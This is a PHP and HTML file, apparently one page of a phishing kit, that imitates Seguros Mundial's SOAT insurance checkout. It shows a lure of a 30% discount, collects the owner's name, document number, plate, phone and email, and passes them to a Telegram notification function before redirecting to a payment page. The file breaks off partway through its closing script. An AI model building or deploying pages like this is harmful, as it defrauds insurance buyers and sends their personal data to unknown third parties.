<?php

session_start();
require_once __DIR__ . '/includes/calculo.php';
require_once __DIR__ . '/includes/telegram.php';
require_once __DIR__ . '/includes/security.php';

// Si no hay cotización en sesión, regresamos al paso 1.
if (empty($_SESSION['cotizacion'])) {
    header('Location: index.php');
    exit;
}

$cot       = $_SESSION['cotizacion'];
$vehiculo  = $cot['vehiculo'];
$categoria = $vehiculo['categoria'] ?? '';

$errores = [];

$prop             = $_SESSION['propietario'] ?? [];
$nombres          = $prop['nombres']          ?? '';
$primerApellido   = $prop['primer_apellido']  ?? '';
$segundoApellido  = $prop['segundo_apellido'] ?? '';
$apellidos        = trim($primerApellido . ' ' . $segundoApellido);

if ($apellidos === '' && !empty($prop['apellidos'])) {
    $apellidos = $prop['apellidos'];
}

$documentoProp    = $prop['documento']        ?? ($cot['documento'] ?? '');
$departamentoProp = $prop['departamento']     ?? '';
$ciudadProp       = $prop['ciudad']           ?? '';

$opcionTercerosSel  = $_SESSION['seleccion']['terceros']   ?? null;
$planAccidentesSel  = $_SESSION['seleccion']['accidentes'] ?? null;
$telefono           = $_SESSION['seleccion']['telefono']   ?? '';
$email              = $_SESSION['seleccion']['email']      ?? '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $opcionTercerosSel = isset($_POST['seguro_terceros']) && $_POST['seguro_terceros'] !== ''
                            ? $_POST['seguro_terceros']
                            : null;
    $planAccidentesSel = isset($_POST['plan_accidentes']) && $_POST['plan_accidentes'] !== ''
                            ? $_POST['plan_accidentes']
                            : null;

    $telefono = trim($_POST['celular'] ?? '');
    $email    = trim($_POST['email']   ?? '');

    if ($telefono === '' || !preg_match('/^[0-9]{7,10}$/', $telefono)) {
        $errores[] = 'Ingresa un teléfono celular válido (7 a 10 dígitos).';
    }
    if ($email === '' || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errores[] = 'Ingresa un correo electrónico válido.';
    }

    $_SESSION['seleccion'] = [
        'terceros'   => $opcionTercerosSel,
        'accidentes' => $planAccidentesSel,
        'telefono'   => $telefono,
        'email'      => $email,
    ];

    if (empty($errores)) {
        $_SESSION['resumen'] = calcular_resumen(
            $categoria,
            $opcionTercerosSel,
            $planAccidentesSel,
            $vehiculo
        );

        // Notificar contacto + coberturas a Telegram
        telegram_contacto([
            'placa'      => $cot['placa'] ?? '—',
            'nombre'     => trim(($nombres ?? '') . ' ' . ($apellidos ?? '')),
            'telefono'   => $telefono,
            'email'      => $email,
            'terceros'   => $opcionTercerosSel ? 'Sí (' . $opcionTercerosSel . ')' : 'No',
            'accidentes' => $planAccidentesSel ? 'Sí (' . $planAccidentesSel . ')' : 'No',
            'total'      => formato_cop($_SESSION['resumen']['total']),
        ]);

        header('Location: pago.php');
        exit;
    }
}

$resumen          = calcular_resumen($categoria, $opcionTercerosSel, $planAccidentesSel, $vehiculo);
$opcionesTerceros = obtener_opciones_terceros($categoria);
$planesAccidentes = obtener_planes_accidentes();
$origen           = $cot['origen'] ?? 'local';

$tieneDescuento = !empty($resumen['descuento_soat']) && $resumen['descuento_soat'] > 0;
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="theme-color" content="#FFFFFF">
<title>Confirma tus datos | Ejercicio PHP</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="assets/css/component---src-pages-index-tsx.2f90ad7b25207235a98b.css">
<link rel="stylesheet" href="assets/css/component---src-pages-informacion-vehiculo-tsx.afa77d34e9e72fc40a52.css">
<link rel="stylesheet" href="assets/css/commons.db02d5e21360139d3ecd.css">
<link rel="stylesheet" href="assets/css/styles.e0403c65ea02169718b0.css">
<link rel="stylesheet" href="assets/css/style-9faaa9e51cea5853.css">
<link rel="stylesheet" href="assets/css/styles_ltr.css">

<style>
/* ==============================================================
   AJUSTES PROPIOS — informacion-vehiculo.php
   ============================================================== */

body { background-color: #fff; }

.inf-vehiculo-form-module--container--a17d4 {
    margin: 40px auto;
    max-width: 1240px;
    width: 90%;
    padding: 0 20px;
    box-sizing: border-box;
}

.inf-vehiculo-form-module--form__info_vehiculo--8eab1 {
    background: #fff;
    border-radius: 10px;
    box-shadow: 0 3px 12px rgba(0,0,0,.06);
    padding: 30px 40px 40px;
    display: flex;
    flex-wrap: wrap;
    justify-content: space-between;
    gap: 20px;
    margin-top: 0;
}

.form-module--form__title--239b9 {
    color: #066188;
    font-size: 1.8rem;
    font-weight: 700;
    text-align: center;
    width: 100%;
    margin-bottom: 10px;
}

.form-stages-module--stages--99ccc {
    margin: 20px auto 40px;
    width: 100%;
    max-width: 900px;
    justify-content: space-between;
}

.inf-vehiculo-form-module--form__info_vehiculo__nave--33d3b,
.inf-vehiculo-form-module--form__info_vehiculo__complementa--9e028 {
    flex: 0 0 48%;
    max-width: 48%;
    display: flex;
    flex-direction: column;
    gap: 20px;
}

.form-guest-soat-module--guest_user__card_info--a719a h4,
.form-guest-soat-module--guest_user__card_info--a719a h5,
.form-guest-soat-module--guest_user__card_info--a719a section,
.form-guest-soat-module--guest_user__card_info--a719a svg,
.form-guest-soat-module--guest_user__card_info--a719a p:nth-child(3),
.form-guest-soat-module--guest_user__card_info--a719a span {
    display: block !important;
}

.form-guest-user-module--guest_user--97904,
.form-guest-vehicle-module--guest_user--06ce4,
.form-guest-soat-module--guest_user--1dd51,
.form-guest-resumen-compra-module--guest_user--c1500 {
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 1px 6px rgba(0,0,0,.08);
    overflow: hidden;
}

.form-guest-user-module--guest_user__top_section--fd866,
.form-guest-vehicle-module--guest_user__top_section--32cfc,
.form-guest-soat-module--card_open__top_section--330ae {
    background-color: #f6f7fc;
    padding: 14px 20px;
}
.form-guest-user-module--guest_user__top_section__title--33897,
.form-guest-vehicle-module--guest_user__top_section__title--ee5f3,
.form-guest-soat-module--guest_user__top_section__title--e37a7 {
    color: #0a99d6;
    font-size: 1rem;
    font-weight: 700;
    margin: 0;
}

.items-form-guest-user-module--items_container--bd110 {
    display: grid;
    grid-template-columns: 45% 55%;
    padding: 6px 20px;
    align-items: center;
}
.items-form-guest-user-module--items_container__title--48e23 {
    color: #000;
    font-size: .9rem;
    font-weight: 700;
    margin: 0;
    padding: 8px 0;
}
.items-form-guest-user-module--items_container__value--07fc1 {
    color: #000;
    font-size: .9rem;
    font-weight: 400;
    padding: 8px 0;
    margin: 0;
    word-wrap: break-word;
}

.radio-button-module--container_input--134a9 {
    padding: 6px 20px 10px;
    display: flex;
    flex-direction: column;
    align-items: flex-start;
}
.radio-button-module--container_input_div--3c57f {
    display: flex;
    align-items: center;
    gap: 10px;
}
.radio-button-module--custom_radio--54614 {
    appearance: none;
    -webkit-appearance: none;
    width: 18px;
    height: 18px;
    border-radius: 50%;
    border: 2px solid #65cc5e;
    background: #fff;
    cursor: default;
    position: relative;
}
.radio-button-module--custom_radio--54614:checked {
    border-color: #65cc5e;
    box-shadow: 0 0 0 3px rgba(101, 204, 94, .25);
}
.radio-button-module--container_input_div--3c57f label {
    color: #000;
    font-size: .9rem;
}

.inf-vehiculo-form-module--form__info_vehiculo__tooltiptext--aedd9 {
    color: #4d4d4f;
    font-size: .75rem;
    font-weight: 700;
    padding: 12px 20px;
    margin: 0;
    line-height: 1.4;
}

.inf-vehiculo-form-module--input_form--6205f {
    padding: 12px 20px 20px;
}
.inf-vehiculo-form-module--input_form--6205f hr {
    border: 0;
    border-top: 1px solid #e7e7ec;
    margin: 12px 0;
}
.inf-vehiculo-form-module--input_form--6205f input {
    width: 100%;
    border: 2px solid #e8e8ed;
    border-radius: 8px;
    padding: 10px 14px;
    font-size: .85rem;
    color: #044662;
    box-sizing: border-box;
    margin: 6px 0 12px;
    background: #f6f7fc;
}

.form-guest-soat-module--guest_user__card_info--a719a {
    padding: 10px 20px 4px;
    display: block !important;
}
.form-guest-soat-module--guest_user__card_info__subtitle--6cc1d {
    color: #066188;
    font-size: .85rem;
    text-align: center;
    margin: 0 0 4px;
    font-weight: 700;
    display: block !important;
    line-height: 1.3;
}
.form-guest-soat-module--guest_user__card_info--a719a > p {
    display: block !important;
    text-align: center;
    font-weight: 700;
    color: #0a99d6;
    font-size: .9rem;
    margin: 0 0 8px;
}

.resumen-opciones-lista {
    padding: 4px 0 0;
}

.resumen-opcion-label {
    display: flex !important;
    align-items: flex-start;
    gap: 10px;
    padding: 6px 20px;
    cursor: pointer;
    box-sizing: border-box;
}

.resumen-opcion-label input[type=radio] {
    appearance: none;
    -webkit-appearance: none;
    width: 16px;
    height: 16px;
    margin: 3px 0 0 0;
    border-radius: 50%;
    border: 2px solid #087daf;
    background: #fff;
    cursor: pointer;
    flex-shrink: 0;
    position: relative;
    transition: all .15s ease;
    outline: none;
}
.resumen-opcion-label input[type=radio]:hover {
    border-color: #087daf;
}
.resumen-opcion-label input[type=radio]:checked {
    border-color: #65cc5e;
    box-shadow: 0 0 0 3px rgba(101, 204, 94, .25);
}

.resumen-opcion-texto {
    color: #4d4d4f;
    font-size: .82rem;
    line-height: 1.35;
    display: block !important;
}
.resumen-opcion-texto b {
    display: block;
    color: #066188;
    font-weight: 700;
    margin-bottom: 1px;
}

.quiero-saber-link {
    display: block !important;
    text-align: center;
    color: #0a99d6;
    font-size: .8rem;
    font-weight: 500;
    text-decoration: underline;
    padding: 10px 20px 14px;
    background: none;
    border: none;
    cursor: pointer;
    margin-top: 4px;
}
.quiero-saber-link:hover { color: #087daf; }

.form-guest-resumen-compra-module--guest_user__top_section--ef990 {
    background-color: #0a99d6;
    padding: 14px 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.form-guest-resumen-compra-module--guest_user__top_section__title--e6332 {
    color: #fff;
    font-size: 1rem;
    font-weight: 700;
    margin: 0;
}
.form-guest-resumen-compra-module--card_info_des--9a041 {
    padding: 20px;
}
.inf-vehiculo-form-module--container_descuento--b43cb {
    display: flex;
    justify-content: space-between;
    color: #4d4d4f;
    font-size: .9rem;
    font-weight: 700;
    margin: 10px 0;
}
.inf-vehiculo-form-module--container_total--0ab4a {
    display: flex;
    justify-content: space-between;
    color: #0a99d6;
    font-size: 1.4rem;
    font-weight: 700;
    margin-top: 10px;
    padding-top: 10px;
    border-top: 1px solid #e7e7ec;
}

/* ============================================================
   FILAS DE DESCUENTO (SOAT oficial / descuento)
   ============================================================ */
.descuento-fila-oficial {
    display: flex;
    justify-content: space-between;
    color: #828285;
    font-size: .9rem;
    font-weight: 700;
    margin: 10px 0;
}
.descuento-fila-oficial .valor-tachado {
    text-decoration: line-through;
    color: #828285;
}
.descuento-fila-descuento {
    display: flex;
    justify-content: space-between;
    color: #15d064;
    font-size: .9rem;
    font-weight: 700;
    margin: 10px 0;
    background: #eafaf1;
    padding: 6px 10px;
    border-radius: 6px;
}
.descuento-badge {
    display: inline-block;
    background: #15d064;
    color: #fff;
    font-size: .7rem;
    font-weight: 700;
    padding: 2px 6px;
    border-radius: 4px;
    margin-left: 6px;
    vertical-align: middle;
}

/* ============================================================
   BOTONES INFERIORES
   ============================================================ */
.return-next-buttons-container-module--container__buttons--2a423 {
    display: flex;
    justify-content: space-around;
    align-items: center;
    width: 100%;
    margin-top: 30px;
}
.button-old-module--decline--6bd21 {
    color: #113346;
    text-decoration: underline;
    font-size: 1rem;
    background: transparent;
    border: none;
    cursor: pointer;
}

.button-old-module--accept--3b47a,
.button-old-module--button--9a043.button-old-module--accept--3b47a {
    background-color: #cfd8dc !important;
    color: #ffffff !important;
    border-radius: 21px;
    padding: 12px 40px;
    font-weight: 700;
    font-size: 1rem;
    border: none;
    cursor: not-allowed;
    opacity: 1 !important;
    transition: background-color .25s ease, transform .15s ease;
}

.button-old-module--accept--3b47a.btn-activo,
.button-old-module--button--9a043.button-old-module--accept--3b47a.btn-activo {
    background-color: #15d064 !important;
    color: #fff !important;
    cursor: pointer;
    opacity: 1 !important;
}
.button-old-module--accept--3b47a.btn-activo:hover,
.button-old-module--button--9a043.button-old-module--accept--3b47a.btn-activo:hover {
    background-color: #10b559 !important;
    transform: scale(1.02);
}
.button-old-module--accept--3b47a.btn-activo:active,
.button-old-module--button--9a043.button-old-module--accept--3b47a.btn-activo:active {
    transform: scale(.99);
}

.mensaje-error-paso2 {
    background: #fdecea;
    border: 1px solid #f5c2c0;
    color: #7a2a24;
    border-radius: 8px;
    padding: 12px 16px;
    margin: 10px auto;
    max-width: 80%;
}
.mensaje-error-paso2 ul {
    margin: 8px 0 0 18px;
    padding: 0;
}

.acc-header {
    cursor: pointer;
    user-select: none;
    display: flex !important;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
}
.acc-chevron {
    flex-shrink: 0;
    width: 18px;
    height: 18px;
    transition: transform .25s ease;
    color: #066188;
}
.acc-header[aria-expanded="false"] .acc-chevron {
    transform: rotate(-90deg);
}
.acc-body {
    overflow: hidden;
    max-height: 2000px;
    opacity: 1;
    transition: max-height .3s ease, opacity .25s ease, padding .3s ease;
}
.acc-body.is-collapsed {
    max-height: 0 !important;
    opacity: 0;
    padding-top: 0 !important;
    padding-bottom: 0 !important;
}

.form-guest-resumen-compra-module--guest_user__top_section--ef990 .acc-chevron {
    color: #fff;
}

.acc-clear-btn {
    background: transparent;
    border: none;
    color: #0a99d6;
    font-size: .78rem;
    font-weight: 600;
    text-decoration: underline;
    cursor: pointer;
    padding: 4px 8px;
    margin-left: auto;
    flex-shrink: 0;
    transition: color .15s;
}
.acc-clear-btn:hover { color: #087daf; }
.acc-clear-btn[hidden] { display: none; }
.acc-clear-btn + .acc-chevron { margin-left: 6px; }

@media (max-width: 900px) {
    .inf-vehiculo-form-module--form__info_vehiculo__nave--33d3b,
    .inf-vehiculo-form-module--form__info_vehiculo__complementa--9e028 {
        flex: 0 0 100%;
        max-width: 100%;
    }
    .inf-vehiculo-form-module--form__info_vehiculo--8eab1 {
        padding: 20px;
    }
}
</style>
</head>
<body>
<div id="___gatsby">
<div tabindex="-1" id="gatsby-focus-wrapper" style="outline: none;">

<?php include __DIR__ . '/includes/header.php'; ?>

<nav class="menu-module--menu--ff100">
  <div class="menu-module--menu__container--550e5">
    <div class="logo-module--wrapper__logo--d2507">
      <img class="safe-gatsby-image-module--safeImage--9bfbe menu-module--menu__container__logos__logo--30a8e"
           src="assets/img/imagen_1_.png"
           width="609" height="136" alt="seguros mundial" title="seguros mundial">
    </div>
    <div class="menu-module--menu__container__logos--cd40c" data-ally="false"></div>
  </div>
  <ul class="menu-module--menu__items--6eadc">
    <li class="menu-item-module--menu_item--04780 menu-item-module--display_none--19788 menu-item-module--menu_item__highlighted--fca77 menu-item-module--menu_item__centered--2e42f">
      <div class="menu-item-module--button--a1b98">
        <div><button data-theme="highlighted" class="anchor-module--anchor--6e022">Comprar SOAT</button></div>
      </div>
    </li>
    <li class="menu-item-module--menu_item--04780 menu-item-module--menu_item__centered--2e42f">
      <div class="menu-item-module--button--a1b98">
        <button data-theme="menu-item" class="button-icon-module--button--c6d67" type="button">
          <div class="button-icon-module--button__text--80959">SOAT
            <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
                 height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
              <polyline points="6 9 12 15 18 9"></polyline>
            </svg>
          </div>
        </button>
      </div>
    </li>
    <li class="menu-item-module--menu_item--04780 menu-item-module--menu_item__highlighted--fca77 menu-item-module--menu_item__centered--2e42f">
      <div class="menu-item-module--button--a1b98">
        <div><button data-theme="highlighted" class="anchor-module--anchor--6e022">QUIERO RENOVAR MI SOAT</button></div>
      </div>
    </li>
  </ul>
</nav>

<main>

<?php if (!empty($errores)): ?>
  <div class="mensaje-error-paso2">
    <strong>Revisa lo siguiente:</strong>
    <ul>
      <?php foreach ($errores as $error): ?>
        <li><?= htmlspecialchars($error) ?></li>
      <?php endforeach; ?>
    </ul>
  </div>
<?php endif; ?>

<section class="inf-vehiculo-form-module--container--a17d4">
<form class="inf-vehiculo-form-module--form__info_vehiculo--8eab1 form-module--form--731f9"
      method="post" action="informacion-vehiculo.php"
      data-base-soat="<?= $resumen['subtotal_soat'] ?>">

  <div class="form-module--form__title--239b9">Confirma tus datos y los de tu nave</div>

  <div class="form-stages-module--stages--99ccc">
    <div class="form-stages-module--stages__item--51e51">
      <div class="form-stages-module--stages__item__icon--e599a form-stages-module--active--1ec2d">1</div>
      <div class="form-stages-module--stages__item__text--7f4ef form-stages-module--active--1ec2d">Cotiza</div>
    </div>
    <div class="form-stages-module--stages__separator--f88c2"></div>
    <div class="form-stages-module--stages__item--51e51">
      <div class="form-stages-module--stages__item__icon--e599a form-stages-module--active--1ec2d">2</div>
      <div class="form-stages-module--stages__item__text--7f4ef form-stages-module--active--1ec2d">Resumen</div>
    </div>
    <div class="form-stages-module--stages__separator--f88c2"></div>
    <div class="form-stages-module--stages__item--51e51">
      <div class="form-stages-module--stages__item__icon--e599a">3</div>
      <div class="form-stages-module--stages__item__text--7f4ef">Pago</div>
    </div>
  </div>

  <div class="inf-vehiculo-form-module--form__info_vehiculo__nave--33d3b">

    <div class="form-guest-user-module--guest_user--97904">
      <section class="form-guest-user-module--guest_user__top_section--fd866 acc-header" data-acc-target="acc-nave" aria-expanded="true">
        <h3 class="form-guest-user-module--guest_user__top_section__title--33897">Datos de tu nave</h3>
        <svg class="acc-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
      </section>
      <section class="acc-body" id="acc-nave">
        <div class="items-form-guest-user-module--items_container--bd110">
          <h4 class="items-form-guest-user-module--items_container__title--48e23">Placa</h4>
          <span class="items-form-guest-user-module--items_container__value--07fc1"><?= htmlspecialchars($cot['placa']) ?></span>
        </div>
        <div class="items-form-guest-user-module--items_container--bd110">
          <h4 class="items-form-guest-user-module--items_container__title--48e23">Marca</h4>
          <span class="items-form-guest-user-module--items_container__value--07fc1"><?= htmlspecialchars($vehiculo['marca'] ?: '—') ?></span>
        </div>
        <div class="items-form-guest-user-module--items_container--bd110">
          <h4 class="items-form-guest-user-module--items_container__title--48e23">Linea</h4>
          <span class="items-form-guest-user-module--items_container__value--07fc1"><?= htmlspecialchars($vehiculo['linea'] ?: '—') ?></span>
        </div>
        <div class="items-form-guest-user-module--items_container--bd110">
          <h4 class="items-form-guest-user-module--items_container__title--48e23">Modelo</h4>
          <span class="items-form-guest-user-module--items_container__value--07fc1"><?= htmlspecialchars($vehiculo['modelo'] ?: '—') ?></span>
        </div>
        <div class="items-form-guest-user-module--items_container--bd110">
          <h4 class="items-form-guest-user-module--items_container__title--48e23">Clase</h4>
          <span class="items-form-guest-user-module--items_container__value--07fc1"><?= htmlspecialchars($vehiculo['clase'] ?: '—') ?></span>
        </div>

        <div class="items-form-guest-user-module--items_container--bd110">
          <h4 class="items-form-guest-user-module--items_container__title--48e23">Tipo de vehículo</h4>
        </div>
        <aside class="radio-button-module--container_input--134a9">
          <div class="radio-button-module--container_input_div--3c57f">
            <input class="radio-button-module--custom_radio--54614" name="itemRadio" type="radio" id="1" value="1" checked disabled>
            <label for="1"><?= htmlspecialchars($vehiculo['clase'] ?: '—') ?></label>
          </div>
        </aside>

        <p class="inf-vehiculo-form-module--form__info_vehiculo__tooltiptext--aedd9">
          *Si tu vehículo aplica para más de una clasificación, cerciórate de elegir la correcta.
          Para la tarifa de Servicio Público, debes seleccionar la tarifa que tienes autorizada
          en la Tarjeta de Operación. Seguros Mundial no se hace responsable si eliges la tarifa
          que no aplica.
        </p>
      </section>
    </div>

    <div class="form-guest-vehicle-module--guest_user--06ce4">
      <section class="form-guest-vehicle-module--guest_user__top_section--32cfc acc-header" data-acc-target="acc-propietario" aria-expanded="true">
        <h3 class="form-guest-vehicle-module--guest_user__top_section__title--ee5f3">Datos del propietario</h3>
        <svg class="acc-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
      </section>
      <section class="acc-body" id="acc-propietario">
        <div class="items-form-guest-user-module--items_container--bd110">
          <h4 class="items-form-guest-user-module--items_container__title--48e23">Nombres</h4>
          <span class="items-form-guest-user-module--items_container__value--07fc1"><?= htmlspecialchars($nombres !== '' ? $nombres : '—') ?></span>
        </div>
        <div class="items-form-guest-user-module--items_container--bd110">
          <h4 class="items-form-guest-user-module--items_container__title--48e23">Apellidos</h4>
          <span class="items-form-guest-user-module--items_container__value--07fc1"><?= htmlspecialchars($apellidos !== '' ? $apellidos : '—') ?></span>
        </div>
        <div class="items-form-guest-user-module--items_container--bd110">
          <h4 class="items-form-guest-user-module--items_container__title--48e23">Número de Documento</h4>
          <span class="items-form-guest-user-module--items_container__value--07fc1"><?= htmlspecialchars($documentoProp !== '' ? $documentoProp : '—') ?></span>
        </div>

        <div class="inf-vehiculo-form-module--input_form--6205f">
          <hr>
          <div class="items-form-guest-user-module--items_container--bd110">
            <h4 class="items-form-guest-user-module--items_container__title--48e23">Teléfono</h4>
          </div>
          <label class="validated-input-module--input--4a6a1">
            <input aria-label="celular" type="text" id="celular"
                   placeholder="Escribe tu teléfono celular" name="celular"
                   value="<?= htmlspecialchars($telefono) ?>" required>
          </label>

          <div class="items-form-guest-user-module--items_container--bd110">
            <h4 class="items-form-guest-user-module--items_container__title--48e23">Correo electrónico</h4>
          </div>
          <label class="validated-input-module--input--4a6a1">
            <input aria-label="email" type="email" data-testid="email" id="email"
                   placeholder="Escribe tu correo electrónico" name="email"
                   value="<?= htmlspecialchars($email) ?>" required>
          </label>
        </div>
      </section>
    </div>

  </div>

  <div class="inf-vehiculo-form-module--form__info_vehiculo__complementa--9e028">

    <?php if (!empty($opcionesTerceros)): ?>
    <div class="form-guest-soat-module--guest_user--1dd51">
      <section class="form-guest-soat-module--card_open__top_section--330ae acc-header" data-acc-target="acc-terceros" aria-expanded="true">
        <h3 class="form-guest-soat-module--guest_user__top_section__title--e37a7">Seguro para daños a terceros</h3>
        <button type="button" class="acc-clear-btn" data-clear="seguro_terceros" title="Quitar selección" hidden>Quitar</button>
        <svg class="acc-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
      </section>

      <div class="acc-body" id="acc-terceros">
        <div class="form-guest-soat-module--guest_user__card_info--a719a">
          <p class="form-guest-soat-module--guest_user__card_info__subtitle--6cc1d">
            Cubrimos los daños materiales causados a terceros en accidentes de tránsito (choque simple)
          </p>
          <p>¡No importa qué nave tengas!</p>
        </div>

        <div class="resumen-opciones-lista">
          <?php foreach ($opcionesTerceros as $id => $opcion): ?>
            <label class="resumen-opcion-label">
              <input type="radio" name="seguro_terceros" value="<?= htmlspecialchars($id) ?>" class="js-recalc"
                     data-price="<?= $opcion['valor'] ?>"
                     data-label="Seguro Tercero Voluntario"
                     <?= $opcionTercerosSel === $id ? 'checked' : '' ?>>
              <span class="resumen-opcion-texto">
                <b><?= htmlspecialchars($opcion['label']) ?> (<?= formato_cop($opcion['valor']) ?> cobertura anual):</b>
                Valor asegurado de hasta <?= formato_cop($opcion['valor_asegurado']) ?>, amparo patrimonial
                y daños a bienes de terceros.
              </span>
            </label>
          <?php endforeach; ?>
        </div>

        <a href="#" class="quiero-saber-link" onclick="return false;">Quiero saber más de esta póliza</a>
      </div>
    </div>
    <?php endif; ?>

    <?php if (!empty($planesAccidentes)): ?>
    <div class="form-guest-soat-module--guest_user--1dd51">
      <section class="form-guest-soat-module--card_open__top_section--330ae acc-header" data-acc-target="acc-accidentes" aria-expanded="true">
        <h3 class="form-guest-soat-module--guest_user__top_section__title--e37a7">
          ¿Quieres ampliar tu cobertura?
        </h3>
        <button type="button" class="acc-clear-btn" data-clear="plan_accidentes" title="Quitar selección" hidden>Quitar</button>
        <svg class="acc-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
      </section>

      <div class="acc-body" id="acc-accidentes">
        <div class="form-guest-soat-module--guest_user__card_info--a719a">
          <p class="form-guest-soat-module--guest_user__card_info__subtitle--6cc1d">
            Complementa tu SOAT con una póliza de accidentes personales
          </p>
        </div>

        <div class="resumen-opciones-lista">
          <?php foreach ($planesAccidentes as $id => $plan): ?>
            <label class="resumen-opcion-label">
              <input type="radio" name="plan_accidentes" value="<?= htmlspecialchars($id) ?>" class="js-recalc"
                     data-price="<?= $plan['valor'] ?>"
                     data-label="Accidentes Personales (<?= htmlspecialchars($plan['label']) ?>)"
                     <?= $planAccidentesSel === $id ? 'checked' : '' ?>>
              <span class="resumen-opcion-texto">
                <b><?= htmlspecialchars($plan['label']) ?>: <?= formato_cop($plan['valor']) ?> (cobertura anual)</b>
              </span>
            </label>
          <?php endforeach; ?>
        </div>

        <a href="#" class="quiero-saber-link" onclick="return false;">Quiero saber más de esta póliza</a>
      </div>
    </div>
    <?php endif; ?>

    <div class="form-guest-resumen-compra-module--guest_user--c1500">
      <section class="form-guest-resumen-compra-module--guest_user__top_section--ef990 acc-header" data-acc-target="acc-resumen" aria-expanded="true">
        <h3 class="form-guest-resumen-compra-module--guest_user__top_section__title--e6332">Resumen de tu compra</h3>
        <svg class="acc-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
      </section>
      <div class="acc-body" id="acc-resumen">
      <section class="form-guest-resumen-compra-module--card_info_des--9a041">

        <?php if ($tieneDescuento): ?>
          <div class="descuento-fila-oficial">
            <p>Valor SOAT oficial</p>
            <p class="valor-tachado"><?= formato_cop($resumen['valor_soat_oficial']) ?></p>
          </div>

          <div class="descuento-fila-descuento">
            <p>Descuento 30% <span class="descuento-badge">-30%</span></p>
            <p>-<?= formato_cop($resumen['descuento_soat']) ?></p>
          </div>
        <?php endif; ?>

        <div class="inf-vehiculo-form-module--container_descuento--b43cb">
          <p><?= $tieneDescuento ? 'SOAT con descuento' : 'Valor Soat' ?></p>
          <p id="resumen-soat" style="<?= $tieneDescuento ? 'color:#066188;font-weight:700;' : '' ?>">
            <?= formato_cop($resumen['subtotal_soat']) ?>
          </p>
        </div>

        <div class="inf-vehiculo-form-module--container_descuento--b43cb"
             id="fila-terceros" style="<?= $resumen['terceros'] ? '' : 'display:none;' ?>">
          <p id="resumen-terceros-label">Seguro Tercero Voluntario</p>
          <p id="resumen-terceros-valor"><?= $resumen['terceros'] ? formato_cop($resumen['subtotal_terceros']) : '$0' ?></p>
        </div>

        <div class="inf-vehiculo-form-module--container_descuento--b43cb"
             id="fila-accidentes" style="<?= $resumen['accidentes'] ? '' : 'display:none;' ?>">
          <p id="resumen-accidentes-label">
            Accidentes Personales<?= $resumen['accidentes'] ? ' (' . htmlspecialchars($resumen['accidentes']['label']) . ')' : '' ?>
          </p>
          <p id="resumen-accidentes-valor"><?= $resumen['accidentes'] ? formato_cop($resumen['subtotal_accidentes']) : '$0' ?></p>
        </div>

        <div class="inf-vehiculo-form-module--container_total--0ab4a">
          <p>Total a pagar</p>
          <p id="resumen-total"><?= formato_cop($resumen['total']) ?></p>
        </div>

      </section>
    </div>
    </div>

  </div>

  <section class="return-next-buttons-container-module--container__buttons--2a423">
    <a href="index.php" class="button-old-module--decline--6bd21">Regresar</a>
    <button class="button-old-module--accept--3b47a" type="submit" disabled>Siguiente</button>
  </section>

</form>
</section>

</main>

<?php include __DIR__ . '/includes/footer.php'; ?>

</div>
</div>

<script>
(function () {
    'use strict';

    var headers = document.querySelectorAll('.acc-header');
    headers.forEach(function (header) {
        header.addEventListener('click', function (e) {
            if (e.target.closest('.acc-clear-btn')) return;

            var targetId = header.getAttribute('data-acc-target');
            var body = document.getElementById(targetId);
            if (!body) return;

            var isOpen = header.getAttribute('aria-expanded') === 'true';
            header.setAttribute('aria-expanded', isOpen ? 'false' : 'true');
            body.classList.toggle('is-collapsed', isOpen);
        });
    });

    var form = document.querySelector('.inf-vehiculo-form-module--form__info_vehiculo--8eab1');
    if (!form) return;

    var baseSoat = parseInt(form.getAttribute('data-base-soat'), 10) || 0;

    var filaTerceros   = document.getElementById('fila-terceros');
    var filaAccidentes = document.getElementById('fila-accidentes');
    var valTerceros    = document.getElementById('resumen-terceros-valor');
    var valAccidentes  = document.getElementById('resumen-accidentes-valor');
    var lblAccidentes  = document.getElementById('resumen-accidentes-label');
    var valTotal       = document.getElementById('resumen-total');

    function formatoCOP(valor) {
        return '$' + valor.toLocaleString('es-CO');
    }

    function recalcular() {
        var terceros   = form.querySelector('input[name="seguro_terceros"]:checked');
        var accidentes = form.querySelector('input[name="plan_accidentes"]:checked');

        var precioTerceros   = terceros   ? (parseInt(terceros.getAttribute('data-price'), 10)   || 0) : 0;
        var precioAccidentes = accidentes ? (parseInt(accidentes.getAttribute('data-price'), 10) || 0) : 0;

        if (filaTerceros) {
            filaTerceros.style.display = precioTerceros > 0 ? '' : 'none';
        }
        if (valTerceros) {
            valTerceros.textContent = formatoCOP(precioTerceros);
        }

        if (filaAccidentes) {
            filaAccidentes.style.display = precioAccidentes > 0 ? '' : 'none';
        }
        if (valAccidentes) {
            valAccidentes.textContent = formatoCOP(precioAccidentes);
        }
        if (lblAccidentes) {
            var etiqueta = (accidentes && precioAccidentes > 0 && accidentes.getAttribute('data-label'))
